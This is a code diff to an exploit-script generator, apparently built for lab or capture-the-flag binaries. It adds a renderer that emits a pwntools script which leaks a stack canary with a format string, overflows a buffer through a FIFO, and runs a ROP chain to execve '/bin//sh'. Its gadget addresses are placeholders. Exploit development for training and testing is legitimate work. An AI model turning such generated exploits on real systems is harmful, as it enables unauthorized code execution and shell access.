@@ -16,10 +16,10 @@ def _process_call(s: Strategy, cfg: Config) -> str:
     env_dict = repr(dict(cfg.env))
     if s.input_mode in ("file-raw", "file-size-data"):
         base_cmd = repr(wrapper + [str(s.binary)])
-        return f"p = process({base_cmd} + [INPUT_FILE], env={env_dict})\n"
+        return f"p = process({base_cmd} + [INPUT_FILE], env={env_dict}, stdin=PTY)\n"
     else:
         cmd = repr(wrapper + [str(s.binary)])
-        return f"p = process({cmd}, env={env_dict})\n"
+        return f"p = process({cmd}, env={env_dict}, stdin=PTY)\n"
 
 
 def _input_file_decl(s: Strategy) -> str:
@@ -60,7 +60,12 @@ def _header(strategy_name: str, binary: Path, notes: list[str], todos: list[str]
         f"TODOs    :\n{todo_lines}\n"
         f'"""\n'
         f"from pwn import *\n\n"
-        f"context.log_level = \"info\"\n"
+        f"context.log_level = \"info\"\n\n"
+        f"def _interact(io) -> None:\n"
+        f"    try:\n"
+        f"        io.interactive()\n"
+        f"    except (EOFError, KeyboardInterrupt):\n"
+        f"        pass\n"
     )
 
 
@@ -128,7 +133,7 @@ def _shellcode(s: Strategy, cfg: Config) -> str:
         + write
         + proc
         + send
-        + "p.interactive()\n"
+        + "_interact(p)\n"
     )
 
 
@@ -212,7 +217,7 @@ def _ret2libc(s: Strategy, cfg: Config) -> str:
         + write
         + proc
         + send
-        + "p.interactive()\n"
+        + "_interact(p)\n"
     )
 
 
@@ -249,7 +254,7 @@ def _rop_chain(s: Strategy, cfg: Config) -> str:
         + write
         + proc
         + send
-        + "p.interactive()\n"
+        + "_interact(p)\n"
     )
 
 
@@ -322,7 +327,7 @@ def _canary_fmt(s: Strategy, cfg: Config) -> str:
         + write
         + proc
         + send
-        + "p.interactive()\n"
+        + "_interact(p)\n"
     )
 
 
@@ -389,7 +394,7 @@ def _canary_brute(s: Strategy, cfg: Config) -> str:
         + write
         + proc
         + send
-        + "p.interactive()\n"
+        + "_interact(p)\n"
     )
 
 
@@ -429,7 +434,7 @@ def _heap_skeleton(s: Strategy, cfg: Config) -> str:
         + write
         + proc
         + send
-        + "p.interactive()\n"
+        + "_interact(p)\n"
     )
 
 
@@ -501,7 +506,108 @@ def _rop_rwx_execve(s: Strategy, cfg: Config) -> str:
         + write
         + proc
         + send
-        + "p.interactive()\n"
+        + "_interact(p)\n"
+    )
+
+
+def _canary_fmt_rop_rwx(s: Strategy, cfg: Config) -> str:
+    """FIFO-based canary leak + ROP execve for interactive file+stdin binaries."""
+    arch_map = {"i386": "i386", "x86_64": "amd64"}
+    arch = arch_map.get(cfg.target.arch, cfg.target.arch)
+    offset = s.offset if s.offset is not None else 32
+
+    a = s.addresses
+    canary_pos = int(a.get("canary_pos", 18))
+    G_pop2    = a.get("G_pop2",    0xDEADBEEF)
+    G_xor_eax = a.get("G_xor_eax", 0xDEADBEEF)
+    G_store   = a.get("G_store",   0xDEADBEEF)
+    G_xor_ecx = a.get("G_xor_ecx", 0xDEADBEEF)
+    G_xor_edx = a.get("G_xor_edx", 0xDEADBEEF)
+    G_mov_al  = a.get("G_mov_al",  0xDEADBEEF)
+    G_int80   = a.get("G_int80",   0xDEADBEEF)
+    BINSH     = a.get("BINSH",     0xDEADBEEF)
+
+    wrapper = cfg.wrapper_parts()
+    env_dict = repr(dict(cfg.env))
+    base_cmd = repr(wrapper + [str(s.binary)])
+
+    canary_off_probed = a.get("canary_off")
+    if canary_off_probed is not None:
+        canary_fill_est = int(canary_off_probed)
+    elif isinstance(offset, int):
+        canary_fill_est = offset - 12
+    else:
+        canary_fill_est = "OFFSET - 12"
+
+    if s.input_mode == "file-size-data":
+        fifo_write = (
+            "    raw = build_payload(canary)\n"
+            "    os.write(fifo_fd, str(len(raw)).encode() + b' ' + raw)\n"
+        )
+    else:
+        fifo_write = "    os.write(fifo_fd, build_payload(canary))\n"
+
+    return (
+        _header("canary-fmt-rop-rwx", s.binary, s.notes, s.todos)
+        + "import os\nimport stat\n"
+        + f"\ncontext.arch = \"{arch}\"\n\n"
+        + f"BINARY           = \"{s.binary}\"\n"
+        + f"FIFO             = \"/tmp/pwnlab_{s.binary.name}.fifo\"\n"
+        + f"CANARY_FMT_POS   = {canary_pos}   # %N$08x stack position of canary\n"
+        + f"OFFSET           = {offset}   # bytes from buffer start to return address\n"
+        + (f"OFFSET_TO_CANARY = {canary_fill_est}   # buffer bytes before canary (auto-probed)\n"
+           if canary_off_probed is not None else
+           f"OFFSET_TO_CANARY = {canary_fill_est}   # buffer bytes before canary — TODO: verify in GDB\n")
+        + "\n# RWX page gadgets (auto-discovered at runtime)\n"
+        + f"G_pop2    = {hex(G_pop2):<12}  # pop eax; pop ebx; ret\n"
+        + f"G_xor_eax = {hex(G_xor_eax):<12}  # xor eax, eax; ret\n"
+        + f"G_store   = {hex(G_store):<12}  # mov [ebx], eax; ret\n"
+        + f"G_xor_ecx = {hex(G_xor_ecx):<12}  # xor ecx, ecx; ret\n"
+        + f"G_xor_edx = {hex(G_xor_edx):<12}  # xor edx, edx; ret\n"
+        + f"G_mov_al  = {hex(G_mov_al):<12}  # mov al, 0xb; ret\n"
+        + f"G_int80   = {hex(G_int80):<12}  # int 0x80; ret\n"
+        + f"BINSH     = {hex(BINSH):<12}  # writable area in rwx page for /bin//sh\\0\n"
+        + "\n"
+        + "def ensure_fifo(path):\n"
+        + "    try:\n"
+        + "        if not stat.S_ISFIFO(os.stat(path).st_mode):\n"
+        + "            raise RuntimeError(f'{path} is not a FIFO')\n"
+        + "    except FileNotFoundError:\n"
+        + "        os.mkfifo(path)\n\n"
+        + "def build_rop() -> bytes:\n"
+        + "    chain  = flat(p32(G_pop2), p32(0x6e69622f), p32(BINSH),   p32(G_store))\n"
+        + "    chain += flat(p32(G_pop2), p32(0x68732f2f), p32(BINSH+4), p32(G_store))\n"
+        + "    chain += flat(p32(G_pop2), p32(0x00000000), p32(BINSH+8), p32(G_store))\n"
+        + "    chain += flat(p32(G_pop2), p32(0xdeadbeef), p32(BINSH))\n"
+        + "    chain += flat(p32(G_xor_ecx), p32(G_xor_edx), p32(G_xor_eax),\n"
+        + "                  p32(G_mov_al),  p32(G_int80))\n"
+        + "    return chain\n\n"
+        + "def build_payload(canary: int) -> bytes:\n"
+        + "    regs_fill = OFFSET - OFFSET_TO_CANARY - 4\n"
+        + "    return flat(b'A' * OFFSET_TO_CANARY, p32(canary), b'B' * regs_fill, build_rop())\n\n"
+        + "def main():\n"
+        + "    ensure_fifo(FIFO)\n"
+        + "    # Open FIFO O_RDWR so the binary's fopen(FIFO, 'r') doesn't block\n"
+        + "    fifo_fd = os.open(FIFO, os.O_RDWR)\n\n"
+        + f"    io = process({base_cmd} + [FIFO], env={env_dict}, stdin=PTY)\n\n"
+        + "    # Step 1: leak canary via format string\n"
+        + f"    io.recvuntil(b'name')  # TODO: adjust to match the binary's name prompt\n"
+        + f"    io.sendline(b'%{canary_pos}$08x')\n"
+        + "    io.recvuntil(b'Welcome ', timeout=3)  # TODO: adjust text preceding canary output\n"
+        + "    canary = int(io.recvline(timeout=3).strip().split()[-1], 16)\n"
+        + "    log.success(f'Canary: {hex(canary)}')\n\n"
+        + "    # Step 2: write overflow payload to FIFO before binary reads the file\n"
+        + fifo_write
+        + "\n    # Step 3: consume the 'press Enter' prompt, then trigger the overflow\n"
+        + "    try:\n"
+        + "        io.recvuntil(b'continue', timeout=3)  # TODO: adjust if prompt differs\n"
+        + "        io.sendline(b'')\n"
+        + "    except EOFError:\n"
+        + "        pass\n\n"
+        + "    _interact(io)\n"
+        + "    os.close(fifo_fd)\n\n"
+        + "if __name__ == '__main__':\n"
+        + "    main()\n"
     )
 
 
@@ -520,14 +626,15 @@ def _unsupported(s: Strategy, cfg: Config) -> str:
 # ---------------------------------------------------------------------------
 
 _RENDERERS = {
-    "shellcode":   _shellcode,
-    "ret2libc":    _ret2libc,
-    "rop":         _rop_chain,
-    "rop-rwx":     _rop_rwx_execve,
-    "canary-fmt":  _canary_fmt,
-    "canary-brute": _canary_brute,
-    "heap":        _heap_skeleton,
-    "unsupported": _unsupported,
+    "shellcode":           _shellcode,
+    "ret2libc":            _ret2libc,
+    "rop":                 _rop_chain,
+    "rop-rwx":             _rop_rwx_execve,
+    "canary-fmt":          _canary_fmt,
+    "canary-fmt-rop-rwx":  _canary_fmt_rop_rwx,
+    "canary-brute":        _canary_brute,
+    "heap":                _heap_skeleton,
+    "unsupported":         _unsupported,
 }
 
 
